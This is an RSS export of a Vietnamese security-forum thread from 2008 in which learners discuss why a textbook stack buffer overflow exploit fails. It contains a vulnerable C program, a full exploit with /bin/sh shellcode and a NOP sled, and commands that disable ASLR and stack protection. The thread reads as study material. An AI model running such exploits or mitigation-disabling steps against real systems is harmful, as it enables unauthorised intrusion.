@@ -1,0 +1,938 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "[Hỏi] - Vài điều về buffer overflow"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/24.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "[Hỏi] - Vài điều về buffer overflow"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>[Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Giả sử ta có một chương trình như sau:<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/*
+ * vuln.c
+ */
+int main&#40;int argc, char *argv&#91;&#93;&#41;
+{
+   char buffer&#91;500&#93;;
+   strcpy&#40;buffer, argv&#91;1&#93;&#41;;
+   return 0;
+}</pre>
+		</div>
+Và kiểm tra thử:<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ gcc -o vuln vuln.c
+...
+$ ./vuln
+Segmentation fault
+$ ./vuln test
+$ ./vuln `perl -e 'print "A"x600;'`
+Segmentation fault</pre>
+		</div>
+Sau đó, ta có thêm một đoạn code exploit.c như sau:<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+char shellcode&#91;&#93;=
+        "\x6a\x0b"              // push $0xb 
+        "\x58"                  // pop %eax 
+        "\x99"                  // cltd 
+        "\x52"                  // push %edx 
+        "\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
+        "\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
+        "\x89\xe3"              // mov %esp,%ebx 
+        "\x52"                  // push %edx 
+        "\x53"                  // push %ebx 
+        "\x89\xe1"              // mov %esp,%ecx 
+        "\xcd\x80";             // int $0x80 
+unsigned long sp&#40;&#41; {
+        __asm__&#40;"movl %esp, %eax"&#41;;}
+
+int main &#40;int argc, char *argv&#91;&#93;&#41; {
+        int i, offset;
+        long esp, ret, *addr_ptr;
+        char *buf, *ptr;
+
+        offset = 0 ;    // Cụ thể cho cái vuln này
+        esp = sp&#40;&#41;;
+        ret = esp - offset;
+
+        printf &#40;"ESP    : 0x%x\n", esp&#41;;
+        printf &#40;"offset : 0x%x\n", offset&#41;;
+        printf &#40;"RetAddr: 0x%x\n", ret&#41;;
+
+        buf = malloc&#40;600&#41;;
+        ptr = buf;
+
+        addr_ptr = &#40;long *&#41;ptr;
+        /* Initialize cái return address */
+        for &#40;i=0; i&lt;600; i+=4&#41;
+                *&#40;addr_ptr++&#41; = ret;
+
+        /* NOP sled */
+        for &#40;i=0; i&lt;202; i++&#41;
+                buf&#91;i&#93; = '\x90';
+
+        /* Bỏ đám shellcode vô đây */
+        ptr = buf + 202;
+        for &#40;i=0; i &lt; strlen&#40;shellcode&#41;; i++&#41;
+                *&#40;ptr++&#41; = shellcode&#91;i&#93;;
+
+        buf&#91;600-1&#93; = 0;
+        execl&#40;"./vuln", "./vuln", buf, 0&#41;;
+        //vuln&#40;buf&#41;;
+        return &#40;0&#41;;
+}</pre>
+		</div>
+<font color='orange'>Câu hỏi</font>
+
+1. Ở vuln, khi run mà không có tham số nào cả thì vì sao bị seg fault? đáng lẽ ra strcpy sẽ không copy gì cả mới đúng chứ? Hay là argv[1] tự động trỏ tới phần memory trên stack, và phần này vô tình nullify nhiều hơn 500 bytes nên mới có tình trạng seg fault?
+
+2. exploit dùng chính ESP để đoán address cho NOP sled. Nhưng, khi exploit gọi execl, execl sẽ fork vuln, và vuln sẽ có stack riêng, vậy kỹ thuật này đâu đoán đúng địa chỉ của NOP sled?
+
+3. Theo "Art of Exploitaion" edition 1, đoạn exploit trên khi run sẽ trả về một shell. Khoai có thay đoạn shellcode (cũng là exec /bin/sh) nhưng khi run exploit thì chỉ nhận được:<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>ESP    : 0xbfa7c608
+offset : 0x0
+RetAddr: 0xbfa7c608
+Segmentation fault</pre>
+		</div>Có phải đây là do việc đoán address bị sai? Khoai đã thử tạo một hàm vuln, và thay vì execl thì khoai cho chính exploit gọi vuln, và điều chỉnh lại offset cho đúng với ESP của vuln, nhưng vẫn không spawn shell được mà chỉ bị seg fault. Lỗi là ở đâu?
+
+4. Ngoài cách dùng ESP để đoán address thì có cách nào khác? Ví dụ khi exploit một client server application thì chương trình exploit đâu có gọi được chương trình bị bof? Vậy càng không thể đoán address dựa trên ESP?
+
+Cám ơn bà con đã đọc.
+khoai]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#120259</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#120259</link>
+				<pubDate><![CDATA[Thu, 20 Mar 2008 10:58:25]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ hello Khoai
+<blockquote> $ gcc -o vuln vuln.c
+ ...
+ $ ./vuln
+ Segmentation fault
+ $ ./vuln test
+ $ ./vuln `perl -e 'print &quot;A&quot;x600;'`
+ Segmentation fault&nbsp;
+		</blockquote>
+--&gt; khúc này chưa nói lên điều gì cả, nó vẫn bị buffer overflow nhưng mà có ứng dụng một số protector thì phải debug ra mới biết chắc được. Như trong gcc ver 4.x nếu khi compile bạn ko có option -fno-stack-protector
+và Disable cái <font color='orange'>randomize_va_space</font> trong
+<font color='orange'>#echo 0&gt; /proc/sys/kernel/randomize_va_space </font>
+<font color='orange'>gcc -fno-stack-protector vuln.c -o vuln</font>
+thì khi debug sẽ thấy EIP sẽ nhảy rối loạn mỗi lần chạy chứ ko bị fixed cố định một chỗ, điều này gây khó khăn khi NOP code + shellcode của ta khi đẩy vào stack vô tình đã replace lên EIP nhảy ngẫu nhiên trong stack --&gt; exploit fail
+<blockquote> 3. Theo &quot;Art of Exploitaion&quot; edition 1, đoạn exploit trên khi run sẽ trả về một shell. Khoai có thay đoạn shellcode (cũng là exec /bin/sh) nhưng khi run exploit thì chỉ nhận được:Code:
+
+ESP    : 0xbfa7c608
+ offset : 0x0
+ RetAddr: 0xbfa7c608
+ Segmentation fault
+
+Có phải đây là do việc đoán address bị sai? Khoai đã thử tạo một hàm vuln, và thay vì execl thì khoai cho chính exploit gọi vuln, và điều chỉnh lại offset cho đúng với ESP của vuln, nhưng vẫn không spawn shell được mà chỉ bị seg fault. Lỗi là ở đâu? &nbsp;
+		</blockquote>
+Khi khoai thay đỗi shellcode thì phải chắc rằng shellcode đó chiếm bao nhiêu byte? từ đó để để tính toán lại một lần nữa (thêm bớt NOP code) để vừa khít buffer bị tràn. Ở đây ko thấy khoai dùng gdb debug xem phải dùng chính xác bao nhiêu byte để ghi đè vừa đủ cái buffer[500] kia (vừa đủ nghĩa là số byte ghi đề buffer[500]+ số byte ghi đè khít 4 byte EIP, cái này thì tùy vào OS, compiler).
+<blockquote> 4. Ngoài cách dùng ESP để đoán address thì có cách nào khác? Ví dụ khi exploit một client server application thì chương trình exploit đâu có gọi được chương trình bị bof? Vậy càng không thể đoán address dựa trên ESP? &nbsp;
+		</blockquote>
+--&gt; Mình chỉ cần gọi chương trình bị bof khi nó ... chưa chạy thôi mà khoai :D. VD một FTP server bị buffer overflow ngay trong buffer username/password thì Hacker chỉ việc nhồi vào một mảng Data+shellcode vào cái username/password đó là có thể exploit bình thường thôi (reverse connect, bind port ...etc), chứ đâu còn phải gọi Vuln này nọ. Còn tấn công local buffer overflow thì tất nhiên phải gọi Vuln nếu nó ... chưa chạy, và hacker phải có quyền .. chạy nó :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#120265</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#120265</link>
+				<pubDate><![CDATA[Thu, 20 Mar 2008 11:30:41]]> GMT</pubDate>
+				<author><![CDATA[ gamma95]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Xin chào anh gamma95,
+
+<p></p>
+		<cite class="blockquote">gamma95 wrote:</cite><br>
+		<blockquote> --&gt; khúc này chưa nói lên điều gì cả,&nbsp;
+		</blockquote>
+Đúng anh, đoạn đó khoai chỉ không hiểu vì sao run ./vuln không có args nào cả cũng bị Seg Fault
+
+<p></p>
+		<cite class="blockquote">gamma95 wrote:</cite><br>
+		<blockquote>Disable cái randomize_va_space trong &nbsp;
+		</blockquote>
+Đúng cái mà khoai đang cần. Đã test vô số code tự viết, mỗi lần chạy là cho một eip, esp khác nhau, không mò ra return address được. Sau khi disable thì cùng đoạn code sẽ được chạy ở một vùng memory cố định.
+
+Lần này lại lò ra câu hỏi mới: Như vậy một chương trình khi được chạy trong hệ thống sẽ có một vùng nhớ nhất định? Ai có tài liệu về memory management trên linux xin cho khoai xin một cái :(
+
+<p></p>
+		<cite class="blockquote">gamma95 wrote:</cite><br>
+		<blockquote> Khi khoai thay đỗi shellcode thì phải chắc rằng shellcode đó chiếm bao nhiêu byte? từ đó để để tính toán lại một lần nữa (thêm bớt NOP code) để vừa khít buffer bị tràn. Ở đây ko thấy khoai dùng gdb debug xem phải dùng chính xác bao nhiêu byte để ghi đè vừa đủ cái buffer[500] kia (vừa đủ nghĩa là số byte ghi đề buffer[500]+ số byte ghi đè khít 4 byte EIP, cái này thì tùy vào OS, compiler).&nbsp;
+		</blockquote>
+hehe, có mò chơi với gdb chứ anh gamma, nhưng chưa mò ra mà lại lười nên hỏi luôn. Có thể NOP + shellcode align chưa đúng nên đã không ghi đè chính xác lên EIP, cái này khoai sẽ xem lại coi sao.
+
+<p></p>
+		<cite class="blockquote">gamma95 wrote:</cite><br>
+		<blockquote>Mình chỉ cần gọi chương trình bị bof khi nó ... chưa chạy thôi mà khoai&nbsp;
+		</blockquote>
+Đó chính là câu hỏi của khoai. Khi mình không gọi nó (đặc biệt là khi vuln ở một remote host) thì mình dựa vào đâu để đoán ra return address? Như vậy không lẽ cùng một đoạn code khi run sẽ được đặt tại một vùng nhớ nhất định (đương nhiên là trên cùng OS)? Câu này tương tự như câu đầu tiên, gamma hay ai có tài liệu về memory management trên linux thì xin send cho khoai.
+
+khoai]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#120449</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#120449</link>
+				<pubDate><![CDATA[Fri, 21 Mar 2008 11:36:14]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>[Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>Giả sử ta có một chương trình như sau:<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/*
+ * vuln.c
+ */
+int main&#40;int argc, char *argv&#91;&#93;&#41;
+{
+   char buffer&#91;500&#93;;
+   strcpy&#40;buffer, argv&#91;1&#93;&#41;;
+   return 0;
+}</pre>
+		</div>
+Và kiểm tra thử:<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ gcc -o vuln vuln.c
+...
+$ ./vuln
+Segmentation fault
+$ ./vuln test
+$ ./vuln `perl -e 'print "A"x600;'`
+Segmentation fault</pre>
+		</div>
+Sau đó, ta có thêm một đoạn code exploit.c như sau:<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+char shellcode&#91;&#93;=
+        "\x6a\x0b"              // push $0xb 
+        "\x58"                  // pop %eax 
+        "\x99"                  // cltd 
+        "\x52"                  // push %edx 
+        "\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
+        "\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
+        "\x89\xe3"              // mov %esp,%ebx 
+        "\x52"                  // push %edx 
+        "\x53"                  // push %ebx 
+        "\x89\xe1"              // mov %esp,%ecx 
+        "\xcd\x80";             // int $0x80 
+unsigned long sp&#40;&#41; {
+        __asm__&#40;"movl %esp, %eax"&#41;;}
+
+int main &#40;int argc, char *argv&#91;&#93;&#41; {
+        int i, offset;
+        long esp, ret, *addr_ptr;
+        char *buf, *ptr;
+
+        offset = 0 ;    // Cụ thể cho cái vuln này
+        esp = sp&#40;&#41;;
+        ret = esp - offset;
+
+        printf &#40;"ESP    : 0x%x\n", esp&#41;;
+        printf &#40;"offset : 0x%x\n", offset&#41;;
+        printf &#40;"RetAddr: 0x%x\n", ret&#41;;
+
+        buf = malloc&#40;600&#41;;
+        ptr = buf;
+
+        addr_ptr = &#40;long *&#41;ptr;
+        /* Initialize cái return address */
+        for &#40;i=0; i&lt;600; i+=4&#41;
+                *&#40;addr_ptr++&#41; = ret;
+
+        /* NOP sled */
+        for &#40;i=0; i&lt;202; i++&#41;
+                buf&#91;i&#93; = '\x90';
+
+        /* Bỏ đám shellcode vô đây */
+        ptr = buf + 202;
+        for &#40;i=0; i &lt; strlen&#40;shellcode&#41;; i++&#41;
+                *&#40;ptr++&#41; = shellcode&#91;i&#93;;
+
+        buf&#91;600-1&#93; = 0;
+        execl&#40;"./vuln", "./vuln", buf, 0&#41;;
+        //vuln&#40;buf&#41;;
+        return &#40;0&#41;;
+}</pre>
+		</div>
+<font color='orange'>Câu hỏi</font>
+
+1. Ở vuln, khi run mà không có tham số nào cả thì vì sao bị seg fault? đáng lẽ ra strcpy sẽ không copy gì cả mới đúng chứ? Hay là argv[1] tự động trỏ tới phần memory trên stack, và phần này vô tình nullify nhiều hơn 500 bytes nên mới có tình trạng seg fault?
+
+2. exploit dùng chính ESP để đoán address cho NOP sled. Nhưng, khi exploit gọi execl, execl sẽ fork vuln, và vuln sẽ có stack riêng, vậy kỹ thuật này đâu đoán đúng địa chỉ của NOP sled?
+
+3. Theo "Art of Exploitaion" edition 1, đoạn exploit trên khi run sẽ trả về một shell. Khoai có thay đoạn shellcode (cũng là exec /bin/sh) nhưng khi run exploit thì chỉ nhận được:<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>ESP    : 0xbfa7c608
+offset : 0x0
+RetAddr: 0xbfa7c608
+Segmentation fault</pre>
+		</div>Có phải đây là do việc đoán address bị sai? Khoai đã thử tạo một hàm vuln, và thay vì execl thì khoai cho chính exploit gọi vuln, và điều chỉnh lại offset cho đúng với ESP của vuln, nhưng vẫn không spawn shell được mà chỉ bị seg fault. Lỗi là ở đâu?
+
+4. Ngoài cách dùng ESP để đoán address thì có cách nào khác? Ví dụ khi exploit một client server application thì chương trình exploit đâu có gọi được chương trình bị bof? Vậy càng không thể đoán address dựa trên ESP?
+
+Cám ơn bà con đã đọc.
+khoai&nbsp;
+		</blockquote>
+
+1. Để verify, bồ thử chạy chương trình trong gdb, rồi xem nó bị segfault chỗ nào. Nếu tôi nhớ không lầm thì nó bị segfault ngay trong strcpy, chứ không phải segfault khi hàm main return.
+
+2. Đúng. Do không đoán đúng được địa chỉ của RET, nên người ta mới dùng NOP sled, để tăng xác suất RET sẽ nhảy về ngay trong đoạn NOP sled.
+
+3. gamma95 đã giải thích nguyên nhân rồi.
+
+4. Câu hỏi này muốn trả lời rốt ráo thì phải xem cái chương trình cần exploit nó được compile ra sao và chạy trong môi trường nào. Nói cách khác, compiler và bản thân kernel của hệ điều hành ảnh hưởng rất lớn đến các kỹ thuật exploitation.
+
+Cùng là một chương trình kể trên, compiled bằng gcc 2.95 và chạy trên kernel không có bất kỳ biện pháp bảo vệ nào khác, thì có hàng chục cách để khai thác. Nhưng cũng là chương trình đó, compiled bằng gcc &gt; 4.1 và chạy trên kernel kiểu của project Hardened Gentoo với tất cả các option được kích hoạt thì có khi không thể exploit được.
+
+Tôi đang viết một tài liệu nhỏ để tổng kết những vấn đề này (như là một ghi chú cho bản thân thôi), khi nào xong tôi sẽ gửi lên HVA.
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141439</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141439</link>
+				<pubDate><![CDATA[Sun, 13 Jul 2008 16:04:32]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">gamma95 wrote:</cite><br>
+		<blockquote><font color='orange'>gcc -fno-stack-protection vuln.c -o vuln.c</font>
+&nbsp;
+		</blockquote>
+
+ -:-) 
+
+<p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>chỉ không hiểu vì sao run ./vuln không có args nào cả cũng bị Seg Fault&nbsp;
+		</blockquote>
+
+Không có arg nào tức là argv sẽ chứa rác. Và khi strcpy truy xuất địa chỉ rác này, nó sẽ bị segfault.
+
+<p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>Như vậy một chương trình khi được chạy trong hệ thống sẽ có một vùng nhớ nhất định&nbsp;
+		</blockquote>
+
+Nếu không có PIC và ASLR, và trong cùng một môi trường, thì các app được load lên giống nhau, tức nó sẽ năm ở cùng chỗ.
+
+<p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>mình dựa vào đâu để đoán ra return address&nbsp;
+		</blockquote>
+
+Mình dựa vào việc mình chạy chính binary đó trên máy mình kiểm soát được. Vả lại "đoán" cũng chỉ là "đoán", không phải là "chỉ điểm".
+
+Theo kinh nghiệm của mình thì đây thật sự là một cách học sai. Cách học đúng sẽ chỉ cho bạn cách "chỉ điểm". Từ đó mới bắt đầu phát triển lên để vượt rào ASLR này nọ.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141442</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141442</link>
+				<pubDate><![CDATA[Sun, 13 Jul 2008 16:27:31]]> GMT</pubDate>
+				<author><![CDATA[ lamer]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>
+Đó chính là câu hỏi của khoai. Khi mình không gọi nó (đặc biệt là khi vuln ở một remote host) thì mình dựa vào đâu để đoán ra return address? Như vậy không lẽ cùng một đoạn code khi run sẽ được đặt tại một vùng nhớ nhất định (đương nhiên là trên cùng OS)?
+&nbsp;
+		</blockquote>
+
+Muốn khai thác một chương trình nào đó, thì phải đạt được 2 điều kiện:
+
+1. đưa được dữ liệu vào: đưa vào cái gì, đưa khi nào và đưa bằng cách nào.
+
+2. quan sát được cách chương trình xử lý dữ liệu đưa vào: static analysis và/hay dynamic analysis. 
+
+Static analysis là dùng disassembler hay decompiler để phân tích mã nguồn của chương trình, và từ đó dự đoán cách thức chương trình sẽ xử lý dữ liệu đưa vào. 
+
+Dynamic analysis là dùng debugger, tracer, profiler để chạy chương trình và kiểm tra thực tế xem chương trình có thực thi đúng như những gì đã dự đoán khi làm static analysis kô.
+
+Trong nhiều trường hợp, chỉ thực hiện được một trong hay cách phân tích này mà thôi, hoặc thậm chí, không thực hiện được cách phân tích nào (như ví dụ mà bồ đưa ra, chương trình vuln nằm ở remote host, chúng ta kô có source code cũng kô có binary để chạy thử), thì chúng ta phải dựa vào điều kiện thứ 2'.
+
+2'. quan sát được kết quả trả về của chương trình. Cái này giống như chosen-plaintext attack, ta nhập input, ta thấy được output, giờ nhiệm vụ là tìm hiểu cách thức chương trình xử lý, tìm lỗ hổng trong cách xử lý đó, rồi khai thác (khác chosen-plaintext attack ở chỗ, cái cần tìm kô phải là key, mà lại là algorithm).
+
+Trong đa số trường hợp, ta có source code hoặc binary của chương trình muốn khai thác, việc còn lại là dựng lại một môi trường giống môi trường của target mà ta muốn khai thác (ví dụ như target chạy Windows XP Sp2, thì ta cũng phải có một môi trường giống y như vậy), rồi tiến hành phân tích, chạy thử trên môi trường nội bộ, sau khi đã thành công trên môi trường nội bộ rồi, thì mới tiến hành khai thác target.
+
+Trong những trường hợp ta không có source code hoặc binary của chương trình muốn khai thác, mà chỉ được quyền nhập input và quan sát output, thì tùy trường hợp mà có khai thác được hay không.
+
+<p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>
+Câu này tương tự như câu đầu tiên, gamma hay ai có tài liệu về memory management trên linux thì xin send cho khoai. 
+&nbsp;
+		</blockquote>
+
+Tài liệu về vấn đề này chủ yếu là cách làm việc của loader trong Linux và cấu trúc của file ELF. Bồ có thể bắt đầu bằng<span class="link"> http://en.wikipedia.org/wiki/Executable_and_Linkable_Format.</span>
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141443</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141443</link>
+				<pubDate><![CDATA[Sun, 13 Jul 2008 16:32:27]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">lamer wrote:</cite><br>
+		<blockquote>
+Vả lại "đoán" cũng chỉ là "đoán", không phải là "chỉ điểm".
+
+Theo kinh nghiệm của mình thì đây thật sự là một cách học sai. Cách học đúng sẽ chỉ cho bạn cách "chỉ điểm". Từ đó mới bắt đầu phát triển lên để vượt rào ASLR này nọ. 
+&nbsp;
+		</blockquote>
+
+Yeah yeah yeah! :d
+
+Một vấn đề cần phải lưu ý là các tài liệu viết về buffer overflow đa số đều dựa trên các môi trường (compiler + kernel) cũ xưa, mà môi trường bây giờ thì đã thay đổi rất nhiều rồi (theo chiều hướng ngày càng khó khai thác). Nên đừng ngạc nhiên nếu tại sao đọc tài liệu rồi làm theo mà vẫn kô làm được.
+
+Muốn học mấy cái này, như sư phụ lamer nói, thì phải có một môi trường thật đơn giản, để từ đó, mình có thể "chỉ tận tay, day tận mặt" cách chương trình bị khai thác, y như trong mấy cái tài liệu classic. 
+
+Một khi đã hiểu cái cốt lõi của vấn đề rồi, thì việc qua mặt mấy thằng như ASLR chủ yếu là dựa vào mẹo vặt mà thôi.
+
+--m
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141446</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141446</link>
+				<pubDate><![CDATA[Sun, 13 Jul 2008 16:53:13]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">lamer wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">gamma95 wrote:</cite><br>
+		<blockquote><font color='orange'>gcc -fno-stack-protection vuln.c -o vuln</font>
+&nbsp;
+		</blockquote>
+
+ -:-)&nbsp;
+		</blockquote> 
+Xin sửa lại <font color='yellow'>gcc -fno-stack-protector vuln.c -o vuln</font>
+Thanks anh Lamer
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141469</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141469</link>
+				<pubDate><![CDATA[Sun, 13 Jul 2008 20:47:04]]> GMT</pubDate>
+				<author><![CDATA[ gamma95]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>
+
+Một vấn đề cần phải lưu ý là các tài liệu viết về buffer overflow đa số đều dựa trên các môi trường (compiler + kernel) cũ xưa, mà môi trường bây giờ thì đã thay đổi rất nhiều rồi (theo chiều hướng ngày càng khó khai thác). Nên đừng ngạc nhiên nếu tại sao đọc tài liệu rồi làm theo mà vẫn kô làm được.
+
+Muốn học mấy cái này, như sư phụ lamer nói, thì phải có một môi trường thật đơn giản, để từ đó, mình có thể "chỉ tận tay, day tận mặt" cách chương trình bị khai thác, y như trong mấy cái tài liệu classic. 
+
+--m
+&nbsp;
+		</blockquote>
+Xin chào các bạn, mình cũng mắc phải một vấn đề như vậy. Nghĩa là, mình đọc sách bắt đầu từ các ví dụ đơn giản và cố gắng hiểu cơ chế của nó. Mình nghĩ là cũng tương đối hiểu cơ chế đó, nhưng cứ đến khi chạy chương trình exploit lại không được như ý muốn. Vậy mình xin hỏi các bạn có kinh nghiệm
+  - Tạo 1 "môi trường đơn giản" là như thế nào? (phải chăng phải dựng lại hệ thống với compiler + kernel cũ xưa)
+  - Để có thể học đúng cách về BoF thì nên tiến hành các bước cụ thể thế nào? (B1: Thử với "môi trường đơn giản"; B2: Một số vấn đề với các hệ thống ngày nay,...?)
+
+Cảm ơn các bạn.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141502</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141502</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 00:48:40]]> GMT</pubDate>
+				<author><![CDATA[ xtinhcau]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Topic này toàn mod màu rực rỡ tham gia không à. Cho tui màu xanh vào tham gia chút.
+
+2 Mr.Khoai: Cậu giải thích và tìm ra được tại sao vuln.c gây page fault chưa, trình bày cho tụi tui hiểu tại sao với.
+
+Thông thường, để chạy được exploit từ vd trong sách thì không dể dàng, vì mấu chốt quan trong là cơ chế sinh mã ASM trong compiler dùng trong sách khác với compiler các bạn đang dùng, hoặc khác version, default options, và các option mà bạn dùng. Vì vậy, các bạn phải disassembly file executable mà bạn đã tự compile ra được, so sánh function stack, epilog/prolog của nó với mã ASM trong sách, tìm ra điểm khác nhau, modify lại shellcode, debug thử....
+
+Cùng 1 source code, vd khi compile ra exe trong VC++6 có thể gây bug, còn compile trong VC++ 200x thì không, hoặc cũng cùng VC++200x, nhưng chỉ cần tắt đi vài option là "xong phim" ;)
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141523</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141523</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 04:48:07]]> GMT</pubDate>
+				<author><![CDATA[ TQN]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/*
+  * vuln.c
+  */
+ int main&#40;int argc, char *argv&#91;&#93;&#41;
+ {
+    char buffer&#91;500&#93;;
+    strcpy&#40;buffer, argv&#91;1&#93;&#41;;
+    return 0;
+ }</pre>
+		</div>
+
+<blockquote>
+ 1. Ở vuln, khi run mà không có tham số nào cả thì vì sao bị seg fault? đáng lẽ ra strcpy sẽ không copy gì cả mới đúng chứ? Hay là argv[1] tự động trỏ tới phần memory trên stack, và phần này vô tình nullify nhiều hơn 500 bytes nên mới có tình trạng seg fault? 
+&nbsp;
+		</blockquote>
+
+<blockquote>
+ 1. Để verify, bồ thử chạy chương trình trong gdb, rồi xem nó bị segfault chỗ nào. Nếu tôi nhớ không lầm thì nó bị segfault ngay trong strcpy, chứ không phải segfault khi hàm main return.
+&nbsp;
+		</blockquote>
+
+<blockquote>
+ Không có arg nào tức là argv sẽ chứa rác. Và khi strcpy truy xuất địa chỉ rác này, nó sẽ bị segfault. 
+&nbsp;
+		</blockquote>
+
+Nguyên nhân lỗi seg fault đó là chỉ tồn tại argv[0] = "vuln" (tên chương trình) và ko có args thì có nghĩa là ko tồn tại argv[1], argv[2],... Có thể kiểm chứng bằng cách modify code, và print giá trị argc. 
+
+PS. Cái này ai học C cũng đều biết. Thôi ko ai nói thì mình tranh phần vậy :D
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141533</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141533</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 10:33:40]]> GMT</pubDate>
+				<author><![CDATA[ lQ]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Tui muốn thấy tận mắt code ASM của gcc32 compile ra kia. Hàm main() được gọi sau khi các startup function của C RTL của gcc32 đã thực thi xong. Tức kernel loader -&gt; startup functions trong C RTL -&gt; main() -&gt; return -&gt; exit functions trong C RTL -&gt; kernel.
+Trong trường hợp này, gcc32 sinh mã call main() ra sao, push cái gì lên stack ? Phải thấy được main() call ra sao và ASM code của main() thì sẽ hiểu được tại sao pagefault. Không đoán theo lý thuyết được, vì các C/C++ compiler sau này sinh mã optimize không biết đâu mà lần.
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141535</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141535</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 11:00:41]]> GMT</pubDate>
+				<author><![CDATA[ TQN]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Hì, topic "xưa cũ" bị mấy lão hâm nóng một cách khác thường
+
